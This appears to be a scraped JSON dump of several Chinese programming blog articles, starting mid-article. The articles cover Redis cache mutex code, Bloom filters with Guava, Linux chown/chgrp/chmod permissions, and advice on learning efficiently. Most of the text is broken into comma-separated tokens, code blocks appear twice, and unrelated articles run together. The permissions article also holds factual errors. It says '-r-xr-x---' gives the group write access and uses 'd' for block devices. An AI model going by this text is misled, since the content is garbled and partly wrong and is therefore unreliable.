,long, ,timeout, ,=, ,v,.,getTimeout,(,),;,  ,        ,if, ,(,v,.,timeout, ,<=, ,System,.,currentTimeMillis,(,),), ,{,  ,            ,// 异步更新后台异常执行  ,            ,threadPool,.,execute,(,new, ,Runnable,(,), ,{,  ,                ,public, ,void, ,run,(,), ,{,  ,                    ,String, ,keyMutex, ,=, ,\"mutex:\", ,+, ,key,;,  ,                    ,if, ,(,redis,.,setnx,(,keyMutex,,, ,\"1\",),), ,{,  ,                        ,// 3 min timeout to avoid mutex holder crash  ,                        ,redis,.,expire,(,keyMutex,,, ,3, ,*, ,60,),;,  ,                        ,String, ,dbValue, ,=, ,db,.,get,(,key,),;,  ,                        ,redis,.,set,(,key,,, ,dbValue,),;,  ,                        ,redis,.,delete,(,keyMutex,),;,  ,                    ,},  ,                ,},  ,            ,},),;,  ,        ,},  ,        ,return, ,value,;,  ,    ,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,优点:,\n,\n,性价最佳，用户无需等待,\n,\n,缺点,\n,\n,无法保证缓存一致性,\n,\n,3、布隆过滤器,\n,1、原理,\n,布隆过滤器的巨大用处就是，能够迅速判断一个元素是否在一个集合中。因此他有如下三个使用场景:,\n,\n,网页爬虫对URL的去重，避免爬取相同的URL地址,\n,反垃圾邮件，从数十亿个垃圾邮件列表中判断某邮箱是否垃圾邮箱（同理，垃圾短信）,\n,缓存击穿，将已存在的缓存放到布隆过滤器中，当黑客访问不存在的缓存时迅速返回避免缓存及DB挂掉。,\n,\n,OK，接下来我们来谈谈布隆过滤器的原理,\n其内部维护一个全为0的bit数组，需要说明的是，布隆过滤器有一个误判率的概念，误判率越低，则数组越长，所占空间越大。误判率越高则数组越小，所占的空间越小。,\n,假设，根据误判率，我们生成一个10位的bit数组，以及2个hash函数（(f_1,f_2)），如下图所示(生成的数组的位数和hash函数的数量，我们不用去关心是如何生成的，有数学论文进行过专业的证明)。,\n,\n,假设输入集合为((N_1,N_2)),经过计算(f_1(N_1))得到的数值得为2，(f_2(N_1))得到的数值为5，则将数组下标为2和下表为5的位置置为1，如下图所示,\n,\n,同理，经过计算(f_1(N_2))得到的数值得为3，(f_2(N_2))得到的数值为6，则将数组下标为3和下表为6的位置置为1，如下图所示,\n,\n,这个时候，我们有第三个数(N_3)，我们判断(N_3)在不在集合((N_1,N_2))中，就进行(f_1(N_3)，f_2(N_3))的计算,\n,\n,若值恰巧都位于上图的红色位置中，我们则认为，(N_3)在集合((N_1,N_2))中,\n,若值有一个不位于上图的红色位置中，我们则认为，(N_3)不在集合((N_1,N_2))中,\n,\n,以上就是布隆过滤器的计算原理，下面我们进行性能测试，,\n,2、性能测试,\n,代码如下:,\n,(1)新建一个maven工程，引入guava包,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n<dependencies>  \r\n        <dependency>  \r\n            <groupId>com.google.guava</groupId>  \r\n            <artifactId>guava</artifactId>  \r\n            <version>22.0</version>  \r\n        </dependency>  \r\n    </dependencies>,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,<,dependencies,>,  ,        ,<,dependency,>,  ,            ,<,groupId,>,com,.,google,.,guava,<,/,groupId,>,  ,            ,<,artifactId,>,guava,<,/,artifactId,>,  ,            ,<,version,>,22.0,<,/,version,>,  ,        ,<,/,dependency,>,  ,    ,<,/,dependencies,>,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,(2)测试一个元素是否属于一个百万元素集合所需耗时,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\npackage bloomfilter;\r\n\r\nimport com.google.common.hash.BloomFilter;\r\nimport com.google.common.hash.Funnels;\r\nimport java.nio.charset.Charset;\r\n\r\npublic class Test {\r\n    private static int size = 1000000;\r\n\r\n    private static BloomFilter<Integer> bloomFilter = BloomFilter.create(Funnels.integerFunnel(), size);\r\n\r\n    public static void main(String[] args) {\r\n        for (int i = 0; i < size; i++) {\r\n            bloomFilter.put(i);\r\n        }\r\n        long startTime = System.nanoTime(); // 获取开始时间\r\n        \r\n        //判断这一百万个数中是否包含29999这个数\r\n        if (bloomFilter.mightContain(29999)) {\r\n            System.out.println(\"命中了\");\r\n        }\r\n        long endTime = System.nanoTime();   // 获取结束时间\r\n\r\n        System.out.println(\"程序运行时间： \" + (endTime - startTime) + \"纳秒\");\r\n\r\n    }\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,package, ,bloomfilter,;, ,import ,com,.,google,.,common,.,hash,.,BloomFilter,;,import ,com,.,google,.,common,.,hash,.,Funnels,;,import ,java,.,nio,.,charset,.,Charset,;, ,public, ,class, ,Test, ,{,    ,private, ,static, ,int, ,size, ,=, ,1000000,;, ,    ,private, ,static, ,BloomFilter,<,Integer,>, ,bloomFilter, ,=, ,BloomFilter,.,create,(,Funnels,.,integerFunnel,(,),,, ,size,),;, ,    ,public, ,static, ,void, ,main,(,String,[,], ,args,), ,{,        ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,size,;, ,i,++,), ,{,            ,bloomFilter,.,put,(,i,),;,        ,},        ,long, ,startTime, ,=, ,System,.,nanoTime,(,),;, ,// 获取开始时间,        ,        ,//判断这一百万个数中是否包含29999这个数,        ,if, ,(,bloomFilter,.,mightContain,(,29999,),), ,{,            ,System,.,out,.,println,(,\"命中了\",),;,        ,},        ,long, ,endTime, ,=, ,System,.,nanoTime,(,),;,   ,// 获取结束时间, ,        ,System,.,out,.,println,(,\"程序运行时间： \", ,+, ,(,endTime, ,-, ,startTime,), ,+, ,\"纳秒\",),;, ,    ,},},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,输出如下所示,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n命中了\r\n程序运行时间： 219386纳秒,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,命中了,程序运行时间：, ,219386,纳秒,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,也就是说，判断一个数是否属于一个百万级别的集合，只要0.219ms就可以完成，性能极佳。,\n,(3)误判率的一些概念,\n,首先，我们先不对误判率做显示的设置，进行一个测试，代码如下所示,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\npackage bloomfilter;\r\n\r\nimport java.util.ArrayList;\r\nimport java.util.List;\r\n\r\nimport com.google.common.hash.BloomFilter;\r\nimport com.google.common.hash.Funnels;\r\n\r\npublic class Test {\r\n    private static int size = 1000000;\r\n\r\n    private static BloomFilter<Integer> bloomFilter = BloomFilter.create(Funnels.integerFunnel(), size);\r\n\r\n    public static void main(String[] args) {\r\n        for (int i = 0; i < size; i++) {\r\n            bloomFilter.put(i);\r\n        }\r\n        List<Integer> list = new ArrayList<Integer>(1000);  \r\n        \r\n        //故意取10000个不在过滤器里的值，看看有多少个会被认为在过滤器里\r\n        for (int i = size + 10000; i < size + 20000; i++) {  \r\n            if (bloomFilter.mightContain(i)) {  \r\n                list.add(i);  \r\n            }  \r\n        }  \r\n        System.out.println(\"误判的数量：\" + list.size()); \r\n\r\n    }\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,package, ,bloomfilter,;, ,import ,java,.,util,.,ArrayList,;,import ,java,.,util,.,List,;, ,import ,com,.,google,.,common,.,hash,.,BloomFilter,;,import ,com,.,google,.,common,.,hash,.,Funnels,;, ,public, ,class, ,Test, ,{,    ,private, ,static, ,int, ,size, ,=, ,1000000,;, ,    ,private, ,static, ,BloomFilter,<,Integer,>, ,bloomFilter, ,=, ,BloomFilter,.,create,(,Funnels,.,integerFunnel,(,),,, ,size,),;, ,    ,public, ,static, ,void, ,main,(,String,[,], ,args,), ,{,        ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,size,;, ,i,++,), ,{,            ,bloomFilter,.,put,(,i,),;,        ,},        ,List,<,Integer,>, ,list, ,=, ,new, ,ArrayList,<,Integer,>,(,1000,),;,  ,        ,        ,//故意取10000个不在过滤器里的值，看看有多少个会被认为在过滤器里,        ,for, ,(,int, ,i, ,=, ,size, ,+, ,10000,;, ,i, ,<, ,size, ,+, ,20000,;, ,i,++,), ,{,  ,            ,if, ,(,bloomFilter,.,mightContain,(,i,),), ,{,  ,                ,list,.,add,(,i,),;,  ,            ,},  ,        ,},  ,        ,System,.,out,.,println,(,\"误判的数量：\", ,+, ,list,.,size,(,),),;, , ,    ,},},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,输出结果如下,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n误判对数量：330,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,误判对数量：,330,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如果上述代码所示，我们故意取10000个不在过滤器里的值，却还有330个被认为在过滤器里，这说明了误判率为0.03.即，在不做任何设置的情况下，默认的误判率为0.03。,\n下面上源码来证明：,\n,\n,接下来我们来看一下，误判率为0.03时，底层维护的bit数组的长度如下图所示,\n,\n,将bloomfilter的构造方法改为,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nprivate static BloomFilter<Integer> bloomFilter = BloomFilter.create(Funnels.integerFunnel(), size,0.01);,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,private, ,static, ,BloomFilter,<,Integer,>, ,bloomFilter, ,=, ,BloomFilter,.,create,(,Funnels,.,integerFunnel,(,),,, ,size,,,0.01,),;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,即，此时误判率为0.01。在这种情况下，底层维护的bit数组的长度如下图所示,\n,\n由此可见，误判率越低，则底层维护的数组越长，占用空间越大。因此，误判率实际取值，根据服务器所能够承受的负载来决定，不是拍脑袋瞎想的。,\n,3、实际使用,\n,redis伪代码如下所示,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nString get(String key) {  \r\n   String value = redis.get(key);  \r\n   if (value  == null) {  \r\n        if(!bloomfilter.mightContain(key)){\r\n            return null;\r\n        }else{\r\n           value = db.get(key);  \r\n           redis.set(key, value);  \r\n        }\r\n    } \r\n    return value；\r\n} ,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,String, ,get,(,String, ,key,), ,{,  ,   ,String, ,value, ,=, ,redis,.,get,(,key,),;,  ,   ,if, ,(,value,  ,==, ,null,), ,{,  ,        ,if,(,!,bloomfilter,.,mightContain,(,key,),),{,            ,return, ,null,;,        ,},else,{,           ,value, ,=, ,db,.,get,(,key,),;,  ,           ,redis,.,set,(,key,,, ,value,),;,  ,        ,},    ,}, ,    ,return, ,value,；,}, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,优点:,\n,\n,思路简单,\n,保证一致性,\n,性能强,\n,\n,缺点,\n,\n,代码复杂度增大,\n,需要另外维护一个集合来存放缓存的Key,\n,布隆过滤器不支持删值操作,\n,\n,总结,\n,在总结部分，来个漫画把。希望对大家找工作有帮助,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,2, 赞,\n        , 5 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114012/", "url_object_id": "06b67f2d6e9b1c6772e9dc3273786a32", "front_image_path": "full/117976068e2e847f1067d25ea3fa90a3b5a60f3f.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "title": "详解 Linux 文档属性、拥有者、群组、权限、差异", "create_time": "2018/05/22", "vote": "1", "bookmark": "4", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,无痴迷，不成功,   ,写在前面,\n,我们都知道,Linux,是一个支持,多用户、多任务,的系统，这也是它最优秀的特性，即可能同时有很多人都在系统上进行工作，所以千万不要,强制关机,，同时，为了保护每个人的隐私和工作环境，针对某一个文档(文件、目录)，,Linux,系统定义了三种身份，分别是,拥有者(owner)、群组(group)、其他人(others),，每一种身份又对应三种权限，分别是,可读(readable)、可写(writable)、可执行(excutable),。,\n,文档属性,\n,使用命令,ls -al --full-time,，或者此命令的简写,ll,可以查看文件或者目录的所有属性。如下：,\n,\n从上面可以看到，每一行都有7列，分别是：,\n,\n,第一列,\n共10位，第1位表示文档类型，,d,表示目录，,-,表示文件，,l,表示链接文件，,d,表示可随机存取的设备，如U盘等，,c,表示一次性读取设备，如鼠标、键盘等。后9位，依次对应三种身份所拥有的权限，身份顺序为：owner、group、others，权限顺序为：readable、writable、excutable。如：,-r-xr-x---,的含义为,当前文档是一个文件，拥有者可读、可执行，同一个群组下的用户，可读、可写，其他人没有任何权限,。,\n,第二列,\n表示连结数,\n,第三列,\n表示拥有者,\n,第四列,\n表示所属群组,\n,第五列,\n表示文档容量大小，单位字节,\n,第六列,\n表示文档最后修改时间，注意不是文档的创建时间哦,\n,第七列,\n表示文档名称。以点(.)开头的是隐藏文档,\n,\n,变更拥有者(owner),\n,位置,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\netc/passwd,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,etc,/,passwd,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,注意：必须是该位置下已存在的帐号。也就是在,/etc/passwd,中有记录的拥有者才能改变。,\n,语法,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nchown [-R] [帐号名称] [文件或目录]\r\nchown [-R] [帐号名称]:[群组名称] [文件或目录],\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,chown, ,[,-,R,], ,[,帐号名称,], ,[,文件或目录,],chown, ,[,-,R,], ,[,帐号名称,],:,[,群组名称,], ,[,文件或目录,],\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,备注：此命令也可以顺便变更文档群组，但还是建议使用,chgrp,命令来变更文档群组。,\n,选项,\n,-R 递归变更，即连同次目录下的所有文件(夹)都要变更。,\n,用法,\n,chown daemon test, 变更文件夹,test,账号为,daemon,。,\n,\n,chown daemon:root test, 变更文件夹,test,群组为,root,。,\n,\n,chown root.users test, 变更文件夹账号为,root,，群组为,users,\n,\n,chown .root test, 单独变更群组为,root,\n,\n,备注：虽然也可以在拥有者与群组间加小数点(,.,)，但为了避免有的同学命名中带点，故还是建议使用冒号“:”来隔开拥有者与群组，避免误判。,\n,变更群组(group),\n,位置,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\netc/group,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,etc,/,group,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,备注：从这里可以查看到所有群组,\n,语法,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nchgrp [-options] [群组名] [文档路径],\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,chgrp, ,[,-,options,], ,[,群组名,], ,[,文档路径,],\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,备注：关于,options,，可以通过,man chgrp、info chgrp、chgrp --help,等命令查询详细用法。,\n,用法,\n,chgrp -R users test, 改变,test,文件夹及其所有子文件(夹)的群组为,users,。,\n,\n,注意：群组名称不在位置内，将会报错,invalid group,。,\n,\n,变更权限,\n,Linux文档的基本权限就三个，分别是,read/write/execute,，加上身份,owner/group/others,也只有九个。权限变更的方式有2种，分别是,符号法,和,数字法,。,\n,符号法,\n,分别使用u，g，o来代表三种身份，a表示全部身份；分别使用r、w、x表示三种权限；分别使用+、-、=表示操作行为,\n,语法,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nchmod | u g o a | +（加入） -（除去） =（设置） | r w x | 文档路径 ,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,chmod, ,|, ,u, ,g, ,o, ,a, ,|, ,+,（加入）, ,-,（除去）, ,=,（设置）, ,|, ,r, ,w, ,x, ,|, ,文档路径, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,设置权限(=),\n,变更目录test的权限为任何人都可读、写、执行。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nchmod u=rwx,g=rwx,o=rwx test \r\n或\r\nchmod ugo=rwx test \r\n或\r\nchmod a=rwx test,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,chmod, ,u,=,rwx,,,g,=,rwx,,,o,=,rwx ,test, ,或,chmod ,ugo,=,rwx ,test, ,或,chmod, ,a,=,rwx ,test,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,去掉权限(-),\n,去掉目录test执行权限,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nchmod u-x,g-x,o-x test \r\n或\r\nchmod ugo-x test \r\n或\r\nchmod a-x test,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,chmod, ,u,-,x,,,g,-,x,,,o,-,x, ,test, ,或,chmod ,ugo,-,x, ,test, ,或,chmod, ,a,-,x, ,test,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,备注：执行权限(x)，对目录而已就是其他用户能否,cd test,成为工作目录。,\n,添加权限(+),\n,增加目录test执行权限,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nchmod u+x,g+x,o+x test \r\n或\r\nchmod ugo+x test \r\n或\r\nchmod a+x test,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,chmod, ,u,+,x,,,g,+,x,,,o,+,x, ,test, ,或,chmod ,ugo,+,x, ,test, ,或,chmod, ,a,+,x, ,test,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,备注：很熟悉吧，如果我们编写完一个shell文件test.sh后，通过,chmod a+x test.sh,就添加了文件执行权限。,\n,数字法,\n,顾名思义，就是使用数字来代表权限，r,w,x分别为4,2,1。三种权限累加就可以得出一种身份的权限。,\n,设置目录test的权限为任何人都可读、写、执行。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nchmod 777 test ,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,chmod, ,777, ,test, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n设置目录test的权限为任何人都可读、写。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nchmod 666 test ,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,chmod, ,666, ,test, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,赋予一个shell文件test.sh可执行权限，拥有者可读、写、执行，群组账号和其他人可读、执行。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nchmod 755 test ,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,chmod, ,755, ,test, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,备注：有没有发现数字法更简单啊！！！,\n,文件和目录权限差异,\n,文档权限对于文件和目录有巨大的差异,\n,文件,\n,针对的是该文件内容,\n,\n,readable 可读取该文件的实际内容,\n,writable 可以编辑、新增或者是修改该文件的内容,\n,executable 有可以被系统执行的权限,\n,\n,备注：具有w权限不可以删除文件，删除文件是目录权限控制的范围！！！记住,文件权限针对是文件内容,。,\n,目录,\n,针对的是该目录下的文件对象,\n,\n,readable 具有读取目录结构清单的权限，即可以通过,ls,命令，查询该目录清单。,\n,writable 具有变动该目录结构清单的权限，即可以创建、迁移、删除、更名该目录下的文件。,\n,executable 具备进入该目录的权限，即可以通过,cd,命令，转到工作目录。,\n,\n,备注：从上面可以得出，开放目录给任何人浏览时，至少需要赋予,r,或,x,权限。读取目录文件内容，至少需要目录权限,x,和文件权限,r,。,\n,总结,\n,Linux,的每个文档可以分别针对三种身份赋予,rwx,权限；,chgrp,命令变更文件群组，,chmod,命令变更文件权限，,chown,变更文件拥有者；那么以后记得使用,文档权限来保护数据的安全性哦,。,\n,如果你觉得本篇文章对您有帮助的话，感谢您的【推荐】,。,\n,如果你对 linux 感兴趣的话可以关注我，我会定期的在博客分享我的学习心得,。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 4 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114031/", "url_object_id": "4382c32a2cdca2e189d33b686dc851bb", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/09/cfb878cc788ffd38bb744dd98d83c4fb.jpg"], "title": "如何高效学习", "create_time": "2018/05/22", "vote": "2", "bookmark": "10", "comments": "3", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,子龙山人,   ,\n,IT 行业是一个变化非常快的行业，它需要我们持续去学习新的知识和技能。 但是，工作以后，我们经常会发现自己学习的东西很少了，倒不是没有时间去学习， 而是学习的效率太低了。久而久之，就演变成『一年的工作经验，重复用十年』。,\n,当然，有些人会说自己经常加班，没有时间学习，这只是表象，时间挤挤总是有的。 你想想你为了上王者，浪费了多少时间？为了刷今日头条，又消磨了多少光阴？,\n,另外，很多人推崇碎片化学习，但是有一些东西碎片化学习效率是很低的，比如数学。,\n,这篇文章是我学习完 coursera 上面的《Learning How to Learn》MOOC加上我自己多年来的学习经验积累整理而来。,\n,注：文中可能有一些内容思考没有很深入，另外一些观点可能还需要更多的时间去检验，读者请自行甄别。,\n, ,\n,\n,1, 一些学习的坏习惯,\n, ,1.1, 被动反复阅读,\n,\n,\n,通常编程新手在学习一个新东西的时候，喜欢买一本权威指南之类的书（大神或者同事推荐），比如「C++ Primer」和「Javascript 权威指南」。 而这样一本书，一般页数在700-1400页左右，要完整读完，在不求甚解的基础之上大概要花费好几个月甚至大半年时间。 别说是新手，就算是一个C++编程老手去读「Javascript 权威指南」这样的书也不可能在只阅读一遍之后就能理解。 这时，很多人会选择重复多次阅读。有人会从头开始重复阅读，也有人只挑不理解的章节来阅读。 我以前上大学那会儿就是这么干的，读了好多C++的书籍，其实自己编写的C++代码并不多，也没有做过大型的C++项目。 看了好多书，其实都是一知半解，效率很低。工作以后，这种学习方式更加不可取，因为你没有那么多时间这么干。,\n,\n,\n,\n,1.2, 喜欢在书上划重点,\n,\n,很多人偏好纸质书，因为在看书的时候手感不错，另外，还可以在书上把喜欢的句子和重点的段落用彩色笔标注出来。 这样做除了给自己造成一种假象「书上的重点我都标出来了，所以我都掌握了」之外，其实并无多大益处。 我现在喜欢在电脑上面看PDF，可以边看边写代码。,\n,读书的时候，还有一个误区，就是大脑被动地跟着作者的思路在走，如果是一本经典的书，你会每每被作者的真知灼见所震惊， 一种「于我心有戚戚焉」的感觉由然而生。如果作者的书写枯燥乏味，估计看几页你就丢到一边去了。在看书的时候，头脑中要 有自我意识，要感觉自己在跟作者对话，对于作者的观点不能一味全盘吸收，可以看一会儿，停下来，问几个为什么。,\n,另外，我并不是说划重点是不好的，只是划重点的效率没有想像中的高。划重点有点像收集资料和网页链接，在你收集了一大堆PDF和视频教程之后， 你会得到一种满足，但是这并不代表你真正学到了东西，这个是要非常警惕的。,\n,\n,\n,\n,1.3, 看书中代码示例认为自己就理解了，从不动手编程,\n,\n,这是新手学编程的大忌，不去动手写，不去跟编译器和开发环境做斗争，你永远不知道软件开发过程中的操蛋事情。,\n,\n,\n,\n,1.4, 拖延,\n,\n,这个问题最大，也是影响N多人不去学习的理由。解决的办法只有一个，马上去做！一旦你开始去做了，你的大脑就不会排斥了。 你的计划再完美，你选的书籍再经典，你挑的视频水平再高，如果你不马上去看，去学，去动手实践，那永远也只是停留在空想的阶段。 成功学习的典范就是成功战胜拖延症的典范。,\n,\n,\n,\n,1.5, 学习任何东西，只停留在编写「Hello World」的水平,\n,\n,这个是什么意思呢？不是说你真的只会写「Hello World」，而是说要跳出自己的舒适区，去尝试一些自己不了解的领域，去做一些超过自己能力范围的事情 。,\n,\n,\n,\n,1.6, 喜欢加QQ群和微信群，美其名曰「技术交流」,\n,\n,这是国内技术圈的一大通病，可能刚开始会聊点技术，但是时间一长就水了。好好的技术群一秒钟就可能变成水群。 而且经常还有老司机冒然发车，此时马上有人冒出一句「留图不留种，菊花万人捅」。,\n,我强烈建议大家不要过渡依赖Q群和微信群来学习技术或者解决问题，技术论坛，Stackoverflow 和 Github issue是你更好的去处。,\n,\n,\n,\n,1.7, 天天熬夜打王者和LOL，睡眠严重不足,\n,\n,实践证明，睡眠不足，啥事也干不成，只想睡觉。有人会说我晚上不到那个点睡不着，我这里有一招。 拿着一本 Kindle，挑一本英文书，躺在床上看，半小时保管睡着。虽然说看书的效果不一定佳，但是催眠也是极好的。,\n,\n,\n,\n,1.8, 工作中遇到模糊的问题不搞清楚，停留在面向 Google 编程,\n,\n,遇到问题，不假思索「百度」和「Google」，虽然现在80%的问题都可以找到解决方案，但是这样做对于自己并无多大益处。 